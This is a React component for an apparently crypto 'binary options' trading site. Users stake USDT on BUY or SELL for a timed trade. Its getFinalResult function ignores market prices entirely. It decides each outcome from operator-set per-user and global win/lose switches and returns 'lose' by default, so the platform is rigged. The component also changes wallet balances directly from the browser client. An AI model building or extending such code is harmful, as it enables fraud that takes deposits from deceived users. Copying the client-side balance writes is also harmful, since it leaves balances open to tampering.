import { useEffect, useState } from "react";
import TradePopup from "./TradePopup";
import TradeResult from "./TradeResult";
import { supabase, supabaseUrl } from "../lib/supabase";
import { useToast } from "../context/ToastContext";


export default function TradePanel({ market }) {


const {showToast}=useToast();


const [user,setUser]=useState(null);
const [wallet,setWallet]=useState(null);

const [amount,setAmount]=useState("");
const [duration,setDuration]=useState(30);

const [activeTrade,setActiveTrade]=useState(null);

const [seconds,setSeconds]=useState(0);

const [isTrading,setIsTrading]=useState(false);

const [side,setSide]=useState("");

const [receipt,setReceipt]=useState(null);

const [tradeSettings,setTradeSettings]=useState([]);


useEffect(() => {

    if (tradeSettings.length === 0) return;

    const money = Number(amount);

    if (!money) {

        setDuration(Number(tradeSettings[0].duration));

        return;

    }

    const setting = tradeSettings.find(item =>

    money >= Number(item.min_amount) &&
    money <= Number(item.max_amount)

);

console.log("Money =", money);
console.log("Setting =", setting);

if (setting) {
    setDuration(Number(setting.duration));
}

}, [amount, tradeSettings]);



useEffect(()=>{

loadUser();

loadTradeSettings();

},[]);





async function loadUser(){


const saved =
localStorage.getItem("user");


if(!saved){

return;

}


const data =
JSON.parse(saved);


setUser(data);


await loadWallet(data.id);


await loadActiveTrade(data.id);


}






async function loadWallet(id){


const {
data
}=await supabase

.from("wallets")

.select("*")

.eq(
"user_id",
id
)

.single();



setWallet(data);


}


async function loadTradeSettings() {

  const session = await supabase.auth.getSession();
  console.log("SESSION =", session);

  const result = await supabase
    .from("trade_settings")
    .select("*");

  console.log("RESULT =", result);

  setTradeSettings(result.data || []);

}


async function loadActiveTrade(id){


const {
data
}=await supabase

.from("trades")

.select("*")

.eq(
"user_id",
id
)

.eq(
"status",
"trading"
)

.order(
"id",
{
ascending:false
}
)

.limit(1)

.maybeSingle();





if(!data){

return;

}


setActiveTrade(data);

setSide(data.side);

setIsTrading(true);



const start =
new Date(data.created_at);



const now =
new Date();



const passed =
Math.floor(
(now-start)/1000
);



setSeconds(

Math.max(
0,
data.duration - passed
)

);



}






function getProfit() {

  const money = Number(amount);

  const setting = tradeSettings.find(
    item =>
      money >= Number(item.min_amount) &&
      money <= Number(item.max_amount)
  );
  if (setting) {
    return Number(setting.profit);
  }
  return 5;
}

async function getFinalResult(userId){

    // =========================
    // 1. เช็กการควบคุมรายบุคคล
    // =========================
    const { data:userControl } =
    await supabase
    .from("trade_user_control")
    .select("*")
    .eq("user_id", userId)
    .maybeSingle();
    
// หมดเวลาควบคุมแล้ว
// =========================
// USER CONTROL
// =========================

if(userControl){

    if(userControl.mode==="win"){
        return "win";
    }

    if(userControl.mode==="lose"){
        return "lose";
    }

}


// <<<<<< แทรกตรงนี้ >>>>>>

const { data:control } =
await supabase
.from("trade_control")
.select("*")
.eq("id",1)
.maybeSingle();

if(control){

    if(control.global_result==="win"){
        return "win";
    }

    if(control.global_result==="lose"){
        return "lose";
    }

}

// <<<<<< จบตรงนี้ >>>>>>

return "lose";

}

// =========================
// START TRADE
// =========================


async function startTrade(type){


if(isTrading){

return;

}

setReceipt(null);

if(!user){

showToast("Please login");

return;

}



const money = Number(amount);

console.log("tradeSettings =", tradeSettings);
console.log("money =", money);

const selectedSetting = tradeSettings.find(item => {
    console.log(item.min_amount, item.max_amount);

    return (
        money >= Number(item.min_amount) &&
        money <= Number(item.max_amount)
    );
});

console.log("selectedSetting =", selectedSetting);

if (!selectedSetting) {
    showToast("Invalid amount");
    return;
}



const balance =
Number(wallet?.balance || 0);




if(balance < money){

showToast("Insufficient balance");

return;

}





// =========================
// CUT WALLET
// =========================


const {
error:cutError
}=await supabase

.from("wallets")

.update({

balance:
balance-money

})

.eq(

"user_id",

user.id

);





if(cutError){

showToast(cutError.message);

return;

}







// =========================
// CREATE TRADE
// =========================


const {
data:trade,
error
}=await supabase

.from("trades")

.insert({

user_id:user.id,

coin:market.code,

side:type,

amount:money,

duration:Number(selectedSetting.duration),

profit:Number(selectedSetting.profit),


// สำคัญ
// ยังไม่ตัดสินผล

result:"pending",

status:"trading",

payout:0

})

.select()

.single();







if(error){



await supabase

.from("wallets")

.update({

balance:balance

})

.eq(

"user_id",

user.id

);



showToast(error.message);

return;

}






setActiveTrade(trade);

setSide(type);

setIsTrading(true);

setDuration(Number(selectedSetting.duration));

setSeconds(Number(selectedSetting.duration));



}









// =========================
// TIMER
// =========================


useEffect(()=>{


if(!isTrading){

return;

}



if(seconds<=0){

finishTrade();

return;

}



const timer=setTimeout(()=>{


setSeconds(
s=>s-1
);


},1000);



return ()=>clearTimeout(timer);



},[
seconds,
isTrading
]);








// =========================
// FINISH
// =========================


async function finishTrade(){


if(!activeTrade){

return;

}

const {

data:trade

}=await supabase

.from("trades")

.select("*")

.eq(

"id",

activeTrade.id

)

.single();

if(!trade){
return;
}

const finalResult =
await getFinalResult(
    trade.user_id
);

let payout=0;
let profit=0;

if(finalResult==="win"){
profit =
Number(trade.amount)

*

Number(trade.profit)
/
100;

payout =
Number(trade.amount)

+

profit;

const {
data:wallet
}=await supabase
.from("wallets")
.select("*")
.eq(
"user_id",
trade.user_id
)
.single();

if(wallet){
await supabase
.from("wallets")
.update({
balance:
Number(wallet.balance||0)

+

payout

})

.eq(

"user_id",

trade.user_id

);



}



}









// UPDATE TRADE


await supabase

.from("trades")

.update({

result:finalResult,

status:"finished",

payout:payout,

profit_amount:profit,

finished_at:

new Date()

.toISOString()

})

.eq(

"id",

trade.id

);








// TRANSACTION


await supabase

.from("transactions")

.insert({

user_id:trade.user_id,

type:"trade",

amount:payout,

status:"completed",

description:

`${trade.coin} ${finalResult}`

});




setIsTrading(false);

setSeconds(0);

setActiveTrade(null);



setReceipt({

...trade,

result:finalResult,

investment:Number(trade.amount),

profit:profit,

loss:finalResult==="lose"
        ? Number(trade.amount)
        : 0,

payout:payout,

duration:trade.duration,

side:trade.side,

market:trade.coin,

openTime:trade.created_at,

closeTime:new Date().toISOString()

});









showToast(

finalResult==="win"

?

"WIN"

:

"LOSE"

);


}









// =========================
// DISPLAY TIME
// =========================


const min = String(

Math.floor(seconds/60)

).padStart(2,"0");



const sec = String(

seconds%60

).padStart(2,"0");

const currentSetting =
    tradeSettings.find(item =>

        Number(amount) >= Number(item.min_amount) &&
        Number(amount) <= Number(item.max_amount)

    ) || tradeSettings[0];





return (

<div className="trade-panel">



<div className="market-title">

<h2>

{market?.name}

</h2>


<p>

{market?.code}

</p>


</div>







<div className="trade-time-tabs">

{[30,60,90,120,180].map(t => (

<button
    key={t}
    disabled
    className={
        duration === t
            ? "time-btn active"
            : "time-btn"
    }
>

    {t}s

</button>

))}

</div>


<input
type="text"
inputMode="numeric"
value={amount}
disabled={isTrading}
placeholder="Amount USDT"
onChange={(e) => {

    const value = e.target.value;

    if (value === "") {
        setAmount("");
        return;
    }

    if (!/^\d+$/.test(value)) {
        return;
    }

    let number = Number(value);

    if (number > 1000000) {
        number = 1000000;
    }

    setAmount(String(number));

}}
/>


<div className="trade-info">

  <div className="trade-info-item">
    <span>Duration</span>
    <strong>{duration}s</strong>
  </div>

  <div className="trade-info-item">
    <span>Profit</span>
    <strong>
      {currentSetting
        ? currentSetting.profit
        : 5}
      %
    </strong>
  </div>

</div>

<div className="trade-buttons">


<button

className="buy-btn"

disabled={isTrading}

onClick={()=>startTrade("BUY")}

>

BUY

</button>





<button

className="sell-btn"

disabled={isTrading}

onClick={()=>startTrade("SELL")}

>

SELL

</button>



</div>




{
isTrading && (

<TradePopup

trade={activeTrade}

seconds={seconds}

side={side}

amount={amount}

/>

)
}




{
receipt && (

<TradeResult
    receipt={receipt}
    onClose={() => setReceipt(null)}
/>

)
}

</div>

);


}

